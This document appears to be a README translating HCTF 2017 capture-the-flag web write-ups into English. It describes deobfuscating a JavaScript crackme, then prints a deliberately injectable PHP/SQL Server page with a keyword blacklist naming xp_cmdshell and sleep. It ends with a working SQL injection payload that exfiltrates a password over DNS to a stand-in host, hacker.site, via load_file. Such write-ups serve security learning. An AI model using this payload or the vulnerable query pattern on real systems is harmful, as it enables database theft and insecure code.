# HCTF2017-writeups-eng
Translations of HCTF writeups to english.

## WEB:


### babycrack

Reference: https://github.com/LoRexxar/HCTF2017-babycrack

"The challenge I think is quite clear, you could even say that this kind of js
is basically the most common.

Obfuscation and Anti-Debugging

Here's a simple strategy for solving:

Patch to remove the anti-debugging code or debug using node -> beautify code ->
remove obfuscation -> analyze the logic of the code. The first part was flawed
(leading to multiple solutions) which was dealt with thru the hint, and when the
rest of the parts are complete you can use the sha256 hash to brute force. The
second part has three subsections, each with its own restrictions. The third
part and the fourth parts are very simple. I set the fifth part to have more
complicated logic, with the length and `ee` in the center, this part has only
one solution!

### boring-website

First we look at the site's index and see `www.zip`, when we download and open
it we see the source code:

```
<?php
echo "Bob received a mission to write a login system on someone else's serve
r, and he he only finished half of the work<br />";
echo "flag is hctf{what you get}<br /><br />";
error_reporting(E_ALL^E_NOTICE^E_WARNING);
try {
$conn = new PDO( "sqlsrv:Server=*****;Database=not_here","oob", "");
}
catch( PDOException $e ) {
die( "Error connecting to SQL Server".$e->getMessage() );
}
#echo "Connected to MySQL<br />";
echo "Connected to SQL Server<br />";
$id = $_GET['id'];
if(preg_match('/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare
|if|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) {
die('NoNoNo');
}
$query = "select message from not_here_too where id = $id"; //link server: O
n linkname:mysql
$stmt = $conn->query( $query );
if ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){
//TO DO: ...
//It's time to sleep...
}
?>
```

We find that SQL Server is using `linkserver` to connect to MySQL. Looking at
how `linkserver` is used, combining comments we can use `select * from
openquery(mysql,'select xxx')` to get data from the MySQL database, but without
getting a response. The `sleep` function is also banned, and then you'll see the
oob warning, after looking up mysql out-of-band, I discovered that the
`load_file` function can use dns to exfiltrate data. What follows is a pretty
simple MySQL injection procedure. The final payload: `/?id=1 union select * from
openquery(mysql,'select load_file(concat("\\\\",(select password from
secret),".hacker.site\\a.txt"))')`.

You could put up a dnslog server or also use ceye.

https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/
